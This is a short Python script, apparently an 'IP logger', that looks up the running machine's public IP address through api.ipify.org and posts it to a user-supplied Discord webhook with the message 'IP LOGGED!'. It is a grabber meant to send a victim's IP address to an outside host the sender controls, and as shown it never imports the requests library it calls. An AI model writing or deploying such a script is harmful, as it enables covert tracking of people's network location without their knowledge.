from discord_webhook import DiscordWebhook
logger = requests.get("https://api.ipify.org/")
webhook = " " #Enter your Discord Webhook in the Quotes
webhook_log = DiscordWebhook(url=webhook, content="***IP LOGGED! IP ADDRESS: " + str(logger.text) + "***")
webhook_log.execute()

